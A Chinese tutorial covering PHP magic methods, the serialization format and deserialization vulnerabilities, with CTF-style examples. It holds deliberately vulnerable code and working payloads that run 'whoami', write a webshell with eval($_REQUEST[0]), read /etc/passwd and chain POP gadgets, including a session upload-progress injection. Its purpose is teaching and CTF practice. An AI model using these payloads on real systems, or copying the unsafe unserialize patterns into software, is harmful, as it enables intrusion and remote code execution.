在执行 `unserialize()` 之前会检查类中是否存在一个`__wakeup()` 方法，如果存在，则会先调用`__wakeup()` 方法，预先准备对象需要的资源。返回 `void`，常用与反序列化操作中重新建立数据库连接或执行其他初始化操作。

| 触发条件                                | 参数   |
| --------------------------------------- | ------ |
| 在使用 `unserialize()` 反序列化之前调用 | 无参数 |

```
php
<?php 
class Demo {
    // 在反序列化之前调用执行该方法
    function __wakeup() {
        echo '我是反序列化之前调用的__wakeup方法';
    }
}

$obj = unserialize('O:4:"Demo":1:{s:4:"name";s:5:"x1ong";}');
```

### __sleep()

序列化 `serialize()` 函数会检查类中是否存在一个魔术方法`__sleep()`，如果存在，该方法会先被调用，然后才执行序列化操作。
此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的属性名称的数字。
如果该方法未返回任何内容，则 `NULL` 被序列化，并产生一个 `E_NOTICE` 级别的错误。

| 触发条件                                | 参数   | 返回值                                 |
| --------------------------------------- | ------ | -------------------------------------- |
| 在使用 `unserialize()` 反序列化之前调用 | 无参数 | 需要被序列化存储的成员属性，是个数组。 |

```
php

<?php 
class Demo {
    public $name = 'x1ong';
    public $age = 18;
    public $gender = 'male';
    function __sleep() {
        // 只序列化 name 和 age 属性
        return array('name','age');
    }
}

$obj = new Demo;
// 在序列化之前先执行__sleep()该函数返回需要序列化的属性名
echo serialize($obj); // O:4:"Demo":2:{s:4:"name";s:5:"x1ong";s:3:"age";i:18;}
?>
```

### __toString()

| 触发条件                                                     | 参数   |
| ------------------------------------------------------------ | ------ |
| 当对象被 echo (或被作为字符串输出或运算) 时触发，该函数都需要有 `return` 值 | 无参数 |

```
php
<?php 
class Demo {
    function __toString() {
        return '我是当对象被echo的时候执行的函数 __toString';
    }
}
$obj = new Demo;
echo $obj; // 我是当对象被echo的时候执行的函数 __toString
?>
```

### __invoke()

| 触发条件               | 参数   |
| ---------------------- | ------ |
| 当对象被当成函数时调用 | 无参数 |

```
php
<?php 
class Demo {
    function __invoke() {
        echo '我是对象被当做函数调用时执行的__invoke()';
    }
}
$obj = new Demo;
$obj();
```

### __get()

| 触发条件                                                   | 参数   |
| ---------------------------------------------------------- | ------ |
| 当对象从外部访问一个不存在 (或不可访问) 的属性时调用该方法 | 无参数 |

```
php
<?php 
class Demo {
    private $name = 'x1ong';
    function __get($name) {
        echo '你访问的属性值不存在或不可访问，访问名称为: ' . $name;
    }
}

$obj = new Demo;
echo $obj->name; // 访问了不可访问的name属性
?>
```

### __set()

| 触发条件                                                   | 参数   |
| ---------------------------------------------------------- | ------ |
| 当对象从外部访问一个不存在 (或不可访问) 的属性时调用该方法 | 无参数 |

在类的外部可以为类的公有属性重新赋值:

```
php
<?php 
class Demo {
    public $name = 'x1ong';
}
$obj = new Demo;
echo $obj->name . PHP_EOL; // x1ong 
// 为类的属性name重新赋值
$obj->name = 'pony';
echo $obj->name . PHP_EOL; // pony
?>
```

但是遇到了访问不到的属性，一旦为他们重新赋值则会报错，此时我们如果非要从外部赋值，可以使用魔术方法 `__set()`:

例如下例:

```
php
<?php 
class Demo {
    protected $name = 'x1ong';
}
$obj = new Demo;
echo $obj->name . PHP_EOL; // x1ong 
// 为类的属性重新赋值  报错 !!! 原因：外部访问不到protected
$obj->name = 'pony';
?>
```

那么如何为外部访问不到的属性重新赋值呢，这个时候就需要用到魔术方法`__set()`:

```
php

<?php 
class Demo {
    // 受保护的属性 类的外部访问不到
    protected $name = 'x1ong';
    function __set($name,$value) {
        // 在类的内部为属性重新赋值
        $this->name = $value;
        echo $this->name . PHP_EOL;
        echo '当设置一个类外无法访问的属性时，自动调用__set()方法' . PHP_EOL;
    }
}
$obj = new Demo;
// 为类的属性重新赋值
$obj->name = 'pony';
?>
```

### __clone()

| 触发条件                                                     | 参数   |
| ------------------------------------------------------------ | ------ |
| 在克隆一个对象的时候调用，在这里可以对克隆出来的对象属性做一些操作 | 无参数 |

```
php

<?php 
class Demo {
    public $name;
    public $age;
    public $gender;
    function __construct($name,$age,$gender) {
        $this->name = $name;
        $this->age = $age;
        $this->gender = $gender;
    }
    function __clone() {
        echo '我在对象被克隆的时候调用: __clone()' . PHP_EOL;
    }
}
$obj = new Demo('x1ong',18,'male');
$obj2 = clone $obj; // 克隆一个对象
echo $obj2->name; // x1ong
?>
```

### __call()

| 触发条件                     | 参数                                                    |
| ---------------------------- | ------------------------------------------------------- |
| 在调用一个不存在的方法时调用 | `$args1`(调用的方法名),`$args2`(传入的参数值，是个数组) |

```
php
<?php 
class Demo {
    function __call($args1,$args2) {
        echo '我是调用对象的一个不存在的方法时执行的__call()';
        echo $args1 . PHP_EOL;
        print_r($args2);
    }
}
$obj = new Demo;
$obj->addInfo(1,2,3);
```

### __callStatic()

| 触发条件                     | 参数                                                    |
| ---------------------------- | ------------------------------------------------------- |
| 当调用不存在的静态方法时调用 | `$args1`(调用的方法名),`$args2`(传入的参数值，是个数组) |

```
php
<?php 
class Demo {
    static function __callStatic($name, $arguments) {
        echo '我是当调用一个不存在的静态方法时执行的__callStatic()' . PHP_EOL;
        echo '调用的静态方法名为' . $name . PHP_EOL;
        echo '传入的参数为：' . PHP_EOL;
        print_r($arguments);
    }

}

$obj = new Demo;
Demo::config('root');
```

### __isset()

| 触发条件                                                     | 参数                           |
| ------------------------------------------------------------ | ------------------------------ |
| 对不可访问或不存在属性使用 `isset()` 或者 `empty()` 的时候触发 | `$args1`(不存在的成员属性名称) |

```
php
<?php 
class Demo {
    function __isset($name) {
        echo '我是当对不可访问属性使用isset()或者empty()的时候触发的__isset()' . PHP_EOL;
        echo '访问的属性名为' . $name . PHP_EOL;
    }
}

$obj = new Demo;
// 触发一次 __isset()
isset($obj->x1ong);
// 触发一次 __isset()
empty($obj->name);
```

### __unset()

| 触发条件                                      | 参数                                    |
| --------------------------------------------- | --------------------------------------- |
| 对不可访问或不存在的属性使用 `unset()` 时触发 | `$args1` (不可访问或者不存在的属性名称) |

```
php
<?php 
class Demo {
    function __unset($name) {
        echo '我是对不可访问或不存在的属性使用unset()时触发__unset()' . PHP_EOL;
        echo '访问的属性名为' . $name . PHP_EOL;
    }
}

$obj = new Demo;
// 触发点
unset($obj->name);
```

## 序列化和反序列化

### 引言

在很多语言中，**将对象的状态信息转为可存储或可传输的过后才能是序列化。序列化的逆向过程则是反序列化**。

主要是为了方便对象的传输，通过文件、网络等方式将序列化后的字符串进行传输。最终可以通过反序列化获取之前的对象。

现在我们都会在淘宝上买桌子，桌子这种很不规则的东西，该怎么从一个城市运输到另一个城市:

1. 这时候一般都会把它拆掉成板子，再装到箱子里面，就可以快递寄出去了，这个过程就类似我们的序列化的过程（把数据转化为可以存储或者传输的形式）。
2. 当买家收到货后，就需要自己把这些板子组装成桌子的样子，这个过程就像反序列的过程（转化成当初的数据对象）。

### PHP 中的序列化

在 php 中可以使用 `serialize` 函数对一个对象或不为资源类型的数据进行序列化，**序列化的内容只包含属性不包含方法**。

#### 数据类型的序列化值

| 数据类型   | 值         | 序列化的值               |
| ---------- | ---------- | ------------------------ |
| null 类型  | null       | `N;`                     |
| 字符串类型 | “hello”    | `s:5:"hello";`           |
| 整型       | 666        | `i:666`;                 |
| 浮点型     | 2.0        | `d:2;`                   |
| 布尔类型   | true       | `b:1;`                   |
| 布尔值类型 | false      | `b:0;`                   |
| 数组类型   | array(6,7) | `a:2:{i:0;i:6;i:1;i:7;}` |

#### 对象的序列化

```
php
<?php 
class Demo {
	public $name = 'x1ong';
	public $age = 18;
	public $address = "HN";
}

$obj = new Demo();
echo serialize($obj);
// O:4:"Demo":3:{s:4:"name";s:5:"x1ong";s:3:"age";i:18;s:7:"address";s:2:"HN";}
?> 
```

序列化值解读:

[![alt text](https://image.3001.net/images/20240325/1711368453_66016905ddeff25377d8d.png)](https://image.3001.net/images/20240325/1711368453_66016905ddeff25377d8d.png)

```
php
<?php 
class Person {
    public $a1;
    public $a2 = false;
    public $a3 = 1;
    public $a4 = 2.0;
    public $a5 = array(1,2);
    public $a6 = "demo";    
}

// 将对象进行序列化
echo serialize(new Person());
// O:6:"Person":6:{s:2:"a1";N;s:2:"a2";b:0;s:2:"a3";i:1;s:2:"a4";d:2;s:2:"a5";a:2:{i:0;i:1;i:1;i:2;}s:2:"a6";s:4:"demo";}
```

解读:

```
bash

O    #  object
6    #  表示类名长度
"Person" # 表示类的名称
6    # 表示类中属性的个数
{}   # 类里面的属性和值都被其包裹
s    # 表示类中的第一个属性名是以String形式进行存储的
2    # 表示类中第一个属性名的长度
"a1" # 表示类中第一个属性名
N    # 表示类中第一个属性值的类型

s    # 表示类中第二个属性名是以String形式进行存储的
2    # 表示类中第二个属性名的长度
"a2" # 表示类中第二个属性名
b    # 表示类中第二个属性值的类型
0    # 表示类中第二个属性的值

s    # 表示类中第三个属性名是以String形式进行存储的
2    # 表示类中的第三个属性名的长度
"a3" # 表示类中第三个属性名
i    # 表示类中第三个属性值的类型
1    # 表示类中第三个属性的值

s    # 表示类中第四个属性名是以String形式进行存储的
2    # 表示类中的第四个属性名的长度
"a4" # 表示类中第四个属性名
d    # 表示类中第四个属性值的类型
2    # 表示类中第四个属性的值

s    # 表示类中第五个属性名是以String形式进行存储的
2    # 表示类中的第五个属性名的长度
"a5" # 表示类中第五个属性名
a    # 表示类中第五个属性值的类型
2    # 表示类中第五个属性值的长度
{}   # 类里面的某个属性的值为数组被其包裹
i    # 表示第一个数组中的第一个元素索引(key)的类型
0    # 表示第一个数组中的第一个元素的索引(key)
i    # 表示第一个数组中的第一个元素值的类型
1    # 表示第一个数组中的第一个值
i    # 表示第一个数组中的第二个元素索引(key)的类型
1    # 表示第一个数组中的第一个元素的索引(key)
i    # 表示第一个数组中的第二个元素值的类型
2    # 表示第一个数组中的第二个值

s    # 表示类中第六个属性名是以String形式进行存储的
2    # 表示类中的第六个属性名的长度
"a6" # 表示类中第六个属性名
s    # 表示类中第六个属性值的类型
4    # 表示类中第六个属性值的长度
"demo" # 表示类中第六个属性的值
```

#### 序列化值类型

| 数据类型                  | 序列化后的类型简称 |
| ------------------------- | ------------------ |
| array                     | a                  |
| boolean                   | b                  |
| double                    | d                  |
| integer                   | i                  |
| common object             | o                  |
| reference                 | r                  |
| non-escaped binary string | s                  |
| custom object             | C                  |
| class                     | O                  |
| null                      | N                  |
| pointer reference         | P                  |
| unicode string            | U                  |

常见的序列化类型: `null => N,boolean => b, integer => i, string => s, array => a, class => O`

如果在一个类的成员属性的值是一个对象，然而将该类进行序列化，那么它的结果会是什么样？

```
php

<?php 
class Demo1 {
    var $name = 'libai';
    function info() {
        echo $this->name . PHP_EOL;
    }
}

class Demo2 {
    var $obj;
    function __construct() {
   // 成员属性的值为一个对象
        $this->obj = new Demo1;
    }
}

$a = new Demo2;
echo serialize($a);  
// O:5:"Demo2":1:{s:3:"obj";O:5:"Demo1":1:{s:4:"name";s:5:"libai";}}
```

#### 访问权限不同序列化不同

在 `PHP` 类中，访问权限的不同，最终序列化出来的字符串里面的属性名也有些不同。

```
php
<?php
class Demo {
    public $name;
    protected $id;
    private $position;
}

echo serialize(new Demo);
```

**序列化值如下:**

[![alt text](https://image.3001.net/images/20240325/1711368461_6601690daf6febc635986.png)](https://image.3001.net/images/20240325/1711368461_6601690daf6febc635986.png)

- `public` : 访问权限为 `public` 的属性，在序列化之后的字符串中，表示属性名的，与实际类中的一致。
- `protected` : 访问权限为 `protected` 的属性，在序列化之后的字符串中，表示属性名的，会在其实际类中的名前面加上 `\x00*\x00`, 例如 `protected $name` 序列化之后，就为 `\x00*\x00name`
- `private` : 访问权限为 `private` 的属性，在序列化之后的字符串中，表示属性名的，会在其前面加上
  `\x00ClassName\x00`，之后紧接的是实际类中的属性名。例如一个 `Person` 类的 `private $addr`; 序列化之后就为 `\x00Person\x00addr`

> `\x00` 到底是啥呢，它是一个 ascii 中十进制为 0 的不可见字符。该字符不可以被复制。如果需要进行 url 传参的时候，需要在其位置使用 `%00` 代替。平时存储可以使用 base64 编码。

### PHP 中的反序列化

在 PHP 中可以使用 `unserialize` 函数对一个序列化字符串进行反序列化。

```
php
<?php
class Demo {
}
// 反序列化的前提是 序列化的类存在
$obj = unserialize('O:4:"Demo":1:{s:4:"name";s:5:"x1ong";}'); 
echo $obj->name;  // x1ong 
```

[![alt text](https://image.3001.net/images/20240325/1711368466_66016912177394ec94b54.png)](https://image.3001.net/images/20240325/1711368466_66016912177394ec94b54.png)

1. `unserialize` 反序列化成功之后返回的是对象。
2. **反序列化生成的对象里面的属性和值，由反序列化里的属性和值提供，与原有类预定义的属性和值无关**。
3. 反序列化不触发类的成员方法；需要调用方法后才能触发 (**魔术方法除外**)
4. **反序列化的类需要真实存在**

## 反序列化漏洞

### 漏洞成因

**原理:** 当进行反序列化的时候**反序列化字符串可控**，并且又没有进行过滤，那么就可能存在反序列化漏洞。

在反序列化的时候，如果这个字符串可控，我们就可以让它**反序列化出代码中任意一个类对象，并且类对象的属性是可控的**。

同时如果类的危险方法被调用时（自动 / 手动）使用了自己成员属性的值，那么这个方法的执行结果我们就可控，所以就造成了反序列化漏洞的存在。

### 漏洞类型

- 原生反序列化
- session 反序列化
- phar 反序列化

### 漏洞代码

```
php

<?php 
highlight_file(__FILE__);
error_reporting(0);
class Execute {
    public $cmd;
    function __construct(){
        $this->cmd = "echo 'hello';";
    }
    function displayInfo() {
        eval($this->cmd);
    }

}
$get = $_REQUEST['word'];
$obj = unserialize($get);
$obj->displayInfo();
```

首先我们先关注如下危险函数:

```
php

// 代码执行
eval()
assert()

// 命令执行
exec()
passthru()
popen()
system()
shell_exec()

// 文件操作
file_get_contents()
file_put_contents()
unlink()
show_source()
highlight_file()
...
```

可以从代码看到在 `displayInfo` 函数中调用了 `eval($this->cmd)` 因此我们只需要想办法 `displayInfo` 函数，将 `cmd` 属性赋值为想要执行的代码即可。

而 `displayInfo` 函数在代码中已经调用了。因此我们只需要将 `cmd` 属性复制为想要执行的代码即可。

构造 Exp:

```
php

<?php 
class Execute {
    public $cmd;
    // function __construct(){
    //     $this->cmd = "echo 'Hello World';";
    // }
    // function displayInfo() {
    //     eval($this->cmd);
    // }
}

$obj = new Execute;
$obj->cmd = "system('whoami');";
echo serialize($obj);
```

执行得到序列化之后的值:

[![alt text](https://image.3001.net/images/20240325/1711368474_6601691a28120ba215716.png)](https://image.3001.net/images/20240325/1711368474_6601691a28120ba215716.png)

传参:

```
php
?word=O:7:"Execute":1:{s:3:"cmd";s:17:"system('whoami');";}
```

[![alt text](https://image.3001.net/images/20240325/1711368477_6601691db04ac66538db5.png)](https://image.3001.net/images/20240325/1711368477_6601691db04ac66538db5.png)

### 怎样利用反序列化

#### 利用技巧

- 寻找 `unserialize()` 函数的参数是否由我们可控的点
- 寻找我们反序列化的目标，重点寻找存在 `__wakeup` 或 `__destruct()` 魔术方法的类
- 一层一层地研究该类在魔术方法中使用的属性和属性调用的方法，看看是否有可控的属性能实现在当前调用的过程中触发的
- 找到我们要控制的属性以后，我们就将代码复制下来，然后构造序列化发起攻击。

#### 构造 EXP 技巧

- 把题目代码复制到本地
- 注释掉方法和删除一些没用的东西
- 本地对属性值构造序列化输出
- 尽量对序列化出来的字符串使用 `urlencode()` 编码
- 分析技巧：先找危险函数，由内到外分析

### 例题

#### 例题 - 1

```
php
<?php
highlight_file(__FILE__);
error_reporting(0);
class vul {
	public $cmd = 'ls';
	function __wakeup() {
		system($this->cmd);
	}
}
unserialize($_POST['data']);
?>
```

构造 EXP:

```
php
<?php
class vul {
    public $cmd = 'ls';
    // function __wakeup() {
    //     system($this->cmd);
    // }
}
$obj = new vul;
$obj->cmd = "whoami";
echo serialize($obj);
?>
```

执行得到:

```
php
O:3:"vul":1:{s:3:"cmd";s:6:"whoami";}
```

利用:

[![alt text](https://image.3001.net/images/20240325/1711368483_660169232ae1faa9af15e.png)](https://image.3001.net/images/20240325/1711368483_660169232ae1faa9af15e.png)

#### 例题 - 2

```
php

<?php 
highlight_file(__FILE__);
error_reporting(0);
class vul {
	public $filename = 'test.txt';
	public $content = 'flag';

	function __wakeup() {
		$this->save();
	}

	public function save() {
		file_put_contents($this->filename, $this->content);
	}
}

unserialize($_POST['data']);
?>
```

构造 EXP:

```
php

<?php 
class vul {
    public $filename;
    public $content;

    // function __wakeup() {
    //     $this->save();
    // }

    // public function save() {
    //     file_put_contents($this->filename, $this->content);
    // }
}

$obj = new vul;
$obj->filename = "shell.php";
$obj->content = '<?php echo 123;eval($_REQUEST[0]);?>';
echo serialize($obj);
?>
```

执行得到:

```
php
O:3:"vul":2:{s:8:"filename";s:9:"shell.php";s:7:"content";s:36:"<?php echo 123;eval($_REQUEST[0]);?>";}
```

利用:

[![alt text](https://image.3001.net/images/20240325/1711368487_660169279562f03402663.png)](https://image.3001.net/images/20240325/1711368487_660169279562f03402663.png)

利用之后，会在同目录下生成 `shell.php` 文件，访问利用即可。

#### 例题 - 3

```
php

<?php 
highlight_file(__FILE__);
error_reporting(0);

class vul {
	public $file;
	public function __toString() {
		if (isset($this->file)) {
			echo file_get_contents($this->file);
			echo "<br />";
			return "good!";
		}
	}
}

$data = unserialize($_POST['data']);
echo $data;
?>
```

构造 EXP:

```
php

<?php 
class vul {
    public $file;
    // public function __toString() {
    //     if (isset($this->file)) {
    //         echo file_get_contents($this->file);
    //         echo "<br />";
    //         return "good!";
    //     }
    // }
}
// $data = unserialize($_POST['data']);
// echo $data;
$obj = new vul;
$obj->file = "/etc/passwd";
echo serialize($obj);
```

执行得到:

```
php
O:3:"vul":1:{s:4:"file";s:11:"/etc/passwd";}
```

利用:

[![alt text](https://image.3001.net/images/20240325/1711368492_6601692c5bf5ffd888fc8.png)](https://image.3001.net/images/20240325/1711368492_6601692c5bf5ffd888fc8.png)

#### 例题 - 4

```
php

<?php 
highlight_file(__FILE__);
error_reporting(0);

class vul1 {
	public $obj;

	function __construct() {
		$this->obj = new vul2();
	}

	function __destruct() {
		$this->obj->action();
	}
}

class vul2 {
	function action() {
		echo 'vul2->action';
	}
}

class vul3 {
	public $cmd;
	function action() {
		system($this->cmd);
	}
}

unserialize($_POST['data']);
```

首先我们先定位到危险函数 `system()` 发现让该函数执行就必须调用 `action` 方法，于是我们就找调用 `action()` 方法的地方，发现在 `vul1` 类下的 `__destruct` 方法下存在 `$this->obj->action()`，由于是析构函数，程序退出自动执行，故而我们只需要让该类下的 `obj` 属性为 `vul3` 对象即可。

构造 EXP:

```
php

<?php 
class vul1 {
    public $obj;

    // function __construct() {
    //     $this->obj = new vul2();
    // }

    // function __destruct() {
    //     $this->obj->action();
    // }
}
class vul2 {
    // function action() {
    //     echo 'vul2->action';
    // }
}
class vul3 {
    public $cmd;
    // function action() {
    //     system($this->cmd);
    // }
}

$obj = new vul3;
$obj->cmd = "whoami";
$obj2 = new vul1;
$obj2->obj = $obj;
echo serialize($obj2);
```

执行得到:

```
php
O:4:"vul1":1:{s:3:"obj";O:4:"vul3":1:{s:3:"cmd";s:6:"whoami";}}
```

利用:

[![alt text](https://image.3001.net/images/20240325/1711368497_660169313efe7fd7195de.png)](https://image.3001.net/images/20240325/1711368497_660169313efe7fd7195de.png)

#### 例题 - 5

```
php
<?php
highlight_file(__FILE__);
error_reporting(0);
class vul {
	protected $cmd = 'ls';
	function __wakeup() {
		system($this->cmd);
	}
}
unserialize($_POST['data']);
?>
```

由于属性 `cmd` 的访问权限为 `protected`，故而在序列化生成的字符串属性前会加上 `\x00*\x00`，成为 `\x00*\x00cmd`，由于 `\x00` 是不可见字符，故而我们需要对其进行 URL 编码。

```
php
<?php
class vul {
    protected $cmd = "whoami";
    function __wakeup() {
        system($this->cmd);
    }
}

$obj = new vul;
echo urlencode(serialize($obj));
?>
```

运行得到:

```
php
O%3A3%3A%22vul%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00cmd%22%3Bs%3A6%3A%22whoami%22%3B%7D
```

执行:

[![alt text](https://image.3001.net/images/20240325/1711368505_66016939069ddd75bab32.png)](https://image.3001.net/images/20240325/1711368505_66016939069ddd75bab32.png)

#### 例题 - 6

```
php
<?php
highlight_file(__FILE__);
error_reporting(0);
class vul {
	private $cmd = 'ls';
	function __wakeup() {
		system($this->cmd);
	}
}
unserialize($_GET['data']);
?>
```

由于属性 `cmd` 的访问权限为 `private`，故而在序列化生成的字符串属性前会加上 `\x00vul\x00`，成为 `\x00vul\x00cmd`，由于 `\x00` 是不可见字符，故而我们需要对其进行 URL 编码。

构造 EXP:

```
php
<?php
class vul {
    private $cmd = "whoami";
    function __wakeup() {
        system($this->cmd);
    }
}

$obj = new vul;
echo urlencode(serialize($obj));
?>
```

执行得到:

```
php
O%3A3%3A%22vul%22%3A1%3A%7Bs%3A8%3A%22%00vul%00cmd%22%3Bs%3A6%3A%22whoami%22%3B%7D
```

利用:

[![alt text](https://image.3001.net/images/20240325/1711368510_6601693e7e685f2026616.png)](https://image.3001.net/images/20240325/1711368510_6601693e7e685f2026616.png)

### session 反序列化

#### 引言

PHP 在 session 读取和存储的时候，都会有一个序列化和反序列化的过程，PHP 内置了多种处理器存取 `$_SESSION` 数据，都会对数据进行序列化和反序列化。

[![alt text](https://image.3001.net/images/20240325/1711368514_66016942e37559f2b822b.png)](https://image.3001.net/images/20240325/1711368514_66016942e37559f2b822b.png)

#### 序列化引擎

除了默认的的 session 序列化引擎 `php` 外，还有几种引擎，不同的引擎存储方式不同。

- `php_binary` 键名的长度对应的 ASCII 字符 + 键名 + 经过 `serialize()` 函数序列化处理的值
- `php` 键名 + 竖线 + 经过 `serialize()` 序列化处理的值
- `php_serialize` `serialize()` 函数序列化处理数组的方式

以如下代码为例:

```
php
<?php
session_start();
$_SESSION['name'] = 'x1ong';
?>
```

**php_binary:**

[![alt text](https://image.3001.net/images/20240325/1711368519_66016947f3f1ee82f0253.png)](https://image.3001.net/images/20240325/1711368519_66016947f3f1ee82f0253.png)

**php**

[![alt text](https://image.3001.net/images/20240325/1711368523_6601694b9f25aac96b5a9.png)](https://image.3001.net/images/20240325/1711368523_6601694b9f25aac96b5a9.png)

**php_serialize**

[![alt text](https://image.3001.net/images/20240325/1711368525_6601694daca4e8f1abaa8.png)](https://image.3001.net/images/20240325/1711368525_6601694daca4e8f1abaa8.png)

三种处理器的存储格式差异，就会造成 session 序列化和反序列化处理器设置不当时的安全隐患。

#### Session 上传进度

[![alt text](https://image.3001.net/images/20240325/1711368530_660169527e71a525c3ff3.png)](https://image.3001.net/images/20240325/1711368530_660169527e71a525c3ff3.png)

```
html
<!DOCTYPE html>
<html>
<body>
<form action="http://120.48.128.24" method="POST" enctype="multipart/form-data">
<input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="PAYLOAD"> 
<input type="file" name="file">
<input type="submit" name="submit">
</form> 
</body>
</html>
<!-- 请先将 session.upload_progress.cleanup 设置为 off 并手动传参PHPSESSID-->
```

此时我们来到 session_xxxx 文件中就可以看到序列化之后的上传进度，并在其中可以看到上传的文件名和 `PHP_SESSION_UPLOAD_PROGRESS` 相应的值:

[![alt text](https://image.3001.net/images/20240325/1711368534_66016956ca50df3895c81.png)](https://image.3001.net/images/20240325/1711368534_66016956ca50df3895c81.png)

#### Session 反序列化题目

```
php

<?php
//A webshell is wait for you
ini_set('session.serialize_handler', 'php');
session_start();
class OowoO {
    public $mdzz;
    function __construct() {
        $this->mdzz = 'phpinfo();';
    }

    function __destruct() {
        eval($this->mdzz);
    }
}
if(isset($_GET['phpinfo'])) {
    $m = new OowoO();
}
else {
    highlight_string(file_get_contents('index.php'));
}
?>
```

##### 分析

通过为 `phpinfo` 参数传入值可执行 `phpinfo()` 函数查看其信息。

[![alt text](https://image.3001.net/images/20240325/1711368539_6601695b08380611005ed.png)](https://image.3001.net/images/20240325/1711368539_6601695b08380611005ed.png)

发现当前页面使用的反序列化引擎为 `php`，而 `php.ini` 配置文件中配置的是 `php_serialize`，这个差异就导致了 `session` 反序列化问题。

##### 利用

构造 EXP:

```
php

<?php 
error_reporting(0);
class OowoO {
    public $mdzz;
    // function __construct() {
    //     $this->mdzz = 'phpinfo();';
    // }

    // function __destruct() {
    //     eval($this->mdzz);
    // }
}
$obj = new OowoO();
$obj->mdzz = "system('whoami');";
echo serialize(new $obj);
?>
php
// 生成如下内容: 
O:5:"OowoO":1:{s:4:"mdzz";s:17:"system('whoami');";}
// 由于当前页面使用的是 php session 序列化引擎，故而将在上方 EXP 前面加上管道符。让 PHP_SESSION_UPLOAD_PROGRESS 生成的内容作为键名，而管道符后面的作为序列化字符串。
|O:5:"OowoO":1:{s:4:"mdzz";s:17:"system('whoami');";} 
// 由于我们需要将以上字符串作为文件名传入，故而需要对双引号转义。
|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:17:\"system('whoami');\";}
```

[![alt text](https://image.3001.net/images/20240325/1711368543_6601695fab7f1457be5b0.png)](https://image.3001.net/images/20240325/1711368543_6601695fab7f1457be5b0.png)

[![alt text](https://image.3001.net/images/20240325/1711368547_6601696375d90c15d49e9.png)](https://image.3001.net/images/20240325/1711368547_6601696375d90c15d49e9.png)
成功执行命令。

### POP 链

#### 引言

POP 链就是利用`魔术方法`在里面进行多次跳转然后获取 `敏感数据` 的一种 `payload`。

#### 例题 1

```
php

<?php 
// flag in flag.php
highlight_file(__FILE__);
error_reporting(0);
class Modifier {
    private $var;
    public function append($value) {
        include($value);
        echo $flag;
    }
    public function __invoke() {
        $this->append($this->var);
    }
}

class Show {
    public $source;
    public $str;
    public function __toString() {
        return $this->str->source;
    }
    public function __wakeup() {
        echo $this->source;
    }
}

class Test {
    public $p = Modifier;
    public function __construct() {
        $this->p = array();
    }
    public function __get($key) {
        $func = $this->p;
        return $func();
    }
}

if (isset($_GET['pop'])) {
    unserialize($_GET['pop']);
}
```

**分析:**

目标：执行 Modifier 类中 `append()` 函数，修改 var 属性为 `flag.php`，
在分析的时候，建议**从内到外**分析:

- 将 Modifier 类中的 var 属性赋值为 `flag.php`，由于 `echo $flag` 在该类的 `append()` 方法中，故而不会自动调用。
- 寻找能调用 `append()` 方法的类：发现在本类的 `__invoke` 魔术方法中调用了 `append()` 方法。
- 寻找能调用 `Modifier` 类 `__invoke` 方法的类：而 `__invoke` 是魔术方法，当当前类 (Modifier) 被当做函数调用时自动调用。那么我们就去找其他类的其他方法有没有函数名我们可控的地方，发现在 `Test` 类中的 `__get` 魔术方法中存在 `$func = $this->p;return $func();` 因此我们只需要将 `Test` 中的 属性 `p` 赋值为 `Modifier` 对象即可。
- 寻找能调用 `Test` 类下 `__get` 方法的类: `__get` 为魔术方法，当访问了一个不存在或者无法访问的属性时自动触发。那么我们看下哪里可以控制调用类的一个属性，发现在 `Show` 类的 `__toString()` 方法中存在 `return $this->str->source;`，那么我们只需要让该类的 `str` 属性赋值为 `Test` 对象。
- 寻找能调用 `Show` 类 `__toString` 方法的类: `__toString` 为魔术方法，当对象被当做字符串执行 (输出) 时自动调用，那么我们看下哪里有字符串输出可控的地方，发现在当前类的 `__wakeup` 方法中存在 `echo $this->source;`，那么我们只需要将 `Show` 类的 `source` 属性赋值为自身对象即可。
- `Show` 类的 `wakeup` 方法在反序列化的时候自动调用，因此我们反序列化 `Show` 对象即可。
- 最后完成的 POP 链就构造完成了，但是由于里面存在私有属性，因此建议对序列化出来的值使用 `urlencode()` 函数进行 URL 编码。

**构造 EXP**:

```
php

<?php 
// flag in flag.php
class Modifier {
    private $var = "flag.php";
    // public function append($value) {
    //     include($value);
    //     echo $flag;
    // }
    // public function __invoke() {
    //     $this->append($this->var);
    // }
}

class Show {
    public $source;
    public $str;
    // public function __toString() {
    //     return $this->str->source;

    // }
    // public function __wakeup() {
    //     echo $this->source;
    // }
}

class Test {
    public $p = Modifier;
    // public function __construct() {
    //     $this->p = array();
    // }
    // public function __get($key) {
    //     $func = $this->p;
    //     return $func();
    // }
}

$obj = new Modifier();
$obj2 = new Test();
$obj2->p = $obj;
$obj3 = new Show();
$obj3->str = $obj2;
$obj3->source = $obj3;

echo urlencode(serialize($obj3));
```

利用:

[![alt text](https://image.3001.net/images/20240325/1711368553_660169690c626ded4134b.png)](https://image.3001.net/images/20240325/1711368553_660169690c626ded4134b.png)

#### 例题 2

```
php

<?php 
header("Content-Type: text/html;charset=utf-8");
error_reporting(0);

class Read {
    public function get_file($value) {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}

class Show {
    public $source;
    public $var;
    public $class1;

    public function __construct($name = 'index.php') {
        $this->source = $name;
        echo $this->source . "Welcome" . "<br />";
    }

    public function __toString() {
        $content = $this->class1->get_file($this->var);
        echo $content;
        return $content;
    }

    public function _show() {
        if (preg_match("/gopher|http|ftp|https|dict|\.\.|flag|file/i", $this->source)) {
            die("hacker");
        } else {
            highlight_file($this->source);
        }
    }

    public function Change() {
        if (preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
        }
    }

    public function __get($key) {
        $function = $this->$key;
        $this->{$key}();
    }
}

if (isset($_GET['sid'])) {
    $sid = $_GET['sid'];
    $config = unserialize($_GET['config']);
    $config->$sid;
} else {
    $show = new Show('index.php');
    $show->_show();
}
?>
```

##### 非预期

**分析**:

- 定位危险函数发现存在 `file_get_contents` 和 `highlight_file`，两者参数都可控，但是 `highlight_file` 过滤了 `flag` 关键字。而 `file_get_contents` 并没有进行任何过滤。
- 目标：执行 `Read` 类中的 `get_file()` 方法。
- 寻找可以调用 `get_file` 方法的类：发现 `Show` 类的 `__toString` 函数存在 `$this->class1->get_file($this->var)`，我们可以将该类的 `class1` 属性赋值为 `Read` 对象，`var` 属性值赋值为 `flag.php` 作为参数传给 `get_file()` 方法执行。
